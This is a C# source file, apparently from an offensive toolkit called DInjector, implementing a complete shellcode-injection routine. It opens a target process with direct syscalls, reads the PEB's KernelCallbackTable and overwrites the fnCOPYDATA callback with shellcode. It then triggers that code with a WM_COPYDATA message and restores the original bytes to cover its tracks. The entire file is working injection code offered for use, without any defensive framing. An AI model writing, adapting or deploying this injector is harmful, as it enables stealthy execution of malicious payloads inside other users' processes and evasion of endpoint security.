﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class RemoteThreadKernelCB
    {
        public static void Execute(byte[] shellcode, int processID)
        {
            #region NtOpenProcess

            IntPtr hProcess = IntPtr.Zero;
            Win32.OBJECT_ATTRIBUTES oa = new Win32.OBJECT_ATTRIBUTES();
            Win32.CLIENT_ID ci = new Win32.CLIENT_ID { UniqueProcess = (IntPtr)processID };

            var ntstatus = Syscalls.NtOpenProcess(
                ref hProcess,
                DI.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
                ref oa,
                ref ci);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtOpenProcess");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtOpenProcess: {ntstatus}");

            #endregion

            #region NtQueryInformationProcess

            DI.Data.Native.PROCESS_BASIC_INFORMATION bi = new DI.Data.Native.PROCESS_BASIC_INFORMATION();
            uint returnLength = 0;

            ntstatus = Syscalls.NtQueryInformationProcess(
                hProcess,
                DI.Data.Native.PROCESSINFOCLASS.ProcessBasicInformation,
                ref bi,
                (uint)(IntPtr.Size * 6),
                ref returnLength);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtQueryInformationProcess");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtQueryInformationProcess: {ntstatus}");

            IntPtr kernelCallbackAddress = (IntPtr)((Int64)bi.PebBaseAddress + 0x58);

            #endregion

            #region NtReadVirtualMemory (kernelCallbackAddress)

            IntPtr kernelCallback = Marshal.AllocHGlobal(IntPtr.Size);
            uint bytesRead = 0;

            ntstatus = Syscalls.NtReadVirtualMemory(
                hProcess,
                kernelCallbackAddress,
                kernelCallback,
                (uint)IntPtr.Size,
                ref bytesRead);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtReadVirtualMemory, kernelCallbackAddress");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtReadVirtualMemory, kernelCallbackAddress: {ntstatus}");

            byte[] kernelCallbackBytes = new byte[bytesRead];
            Marshal.Copy(kernelCallback, kernelCallbackBytes, 0, (int)bytesRead);
            Marshal.FreeHGlobal(kernelCallback);
            IntPtr kernelCallbackValue = (IntPtr)BitConverter.ToInt64(kernelCallbackBytes, 0);

            #endregion

            #region NtReadVirtualMemory (kernelCallbackValue)

            int dataSize = Marshal.SizeOf(typeof(Win32.KernelCallBackTable));
            IntPtr data = Marshal.AllocHGlobal(dataSize);
            bytesRead = 0;

            ntstatus = Syscalls.NtReadVirtualMemory(
                hProcess,
                kernelCallbackValue,
                data,
                (uint)dataSize,
                ref bytesRead);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtReadVirtualMemory, kernelCallbackValue");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtReadVirtualMemory, kernelCallbackValue: {ntstatus}");

            Win32.KernelCallBackTable kernelStruct = (Win32.KernelCallBackTable)Marshal.PtrToStructure(data, typeof(Win32.KernelCallBackTable));
            Marshal.FreeHGlobal(data);

            #endregion

            #region NtReadVirtualMemory (kernelStruct.fnCOPYDATA)

            IntPtr origData = Marshal.AllocHGlobal(shellcode.Length);
            bytesRead = 0;

            ntstatus = Syscalls.NtReadVirtualMemory(
                hProcess,
                kernelStruct.fnCOPYDATA,
                origData,
                (uint)shellcode.Length,
                ref bytesRead);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtReadVirtualMemory, kernelStruct.fnCOPYDATA");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtReadVirtualMemory, kernelStruct.fnCOPYDATA: {ntstatus}");

            #endregion

            #region NtProtectVirtualMemory (PAGE_READWRITE)

            IntPtr protectAddress = kernelStruct.fnCOPYDATA;
            IntPtr regionSize = (IntPtr)shellcode.Length;
            uint oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_READWRITE,
                ref oldProtect);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtProtectVirtualMemory, PAGE_READWRITE");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory (shellcode)

            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            uint bytesWritten = 0;

            ntstatus = Syscalls.NtWriteVirtualMemory(
                hProcess,
                kernelStruct.fnCOPYDATA,
                buffer,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtWriteVirtualMemory, shellcode");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtWriteVirtualMemory, shellcode: {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory (oldProtect)

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                oldProtect,
                ref oldProtect);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtProtectVirtualMemory, oldProtect");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");

            #endregion

            #region FindWindowExA

            IntPtr hWindow = Win32.FindWindowExA(IntPtr.Zero, IntPtr.Zero, Process.GetProcessById(processID).ProcessName, null);

            #endregion

            #region SendMessageA

            string msg = "Trigger\0";
            var cds = new Win32.COPYDATASTRUCT
            {
                dwData = new IntPtr(3),
                cbData = msg.Length,
                lpData = msg
            };

            _ = Win32.SendMessageA(hWindow, Win32.WM_COPYDATA, IntPtr.Zero, ref cds);

            #endregion

            #region NtProtectVirtualMemory (PAGE_READWRITE)

            oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_READWRITE,
                ref oldProtect);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtProtectVirtualMemory, PAGE_READWRITE");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory (origData)

            bytesWritten = 0;

            ntstatus = Syscalls.NtWriteVirtualMemory(
                hProcess,
                kernelStruct.fnCOPYDATA,
                origData,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtWriteVirtualMemory, origData");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtWriteVirtualMemory, origData: {ntstatus}");

            Marshal.FreeHGlobal(origData);

            #endregion

            #region NtProtectVirtualMemory (oldProtect)

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                oldProtect,
                ref oldProtect);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtProtectVirtualMemory, oldProtect");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");

            #endregion

            Win32.CloseHandle(hWindow);
            Win32.CloseHandle(hProcess);
        }
    }
}
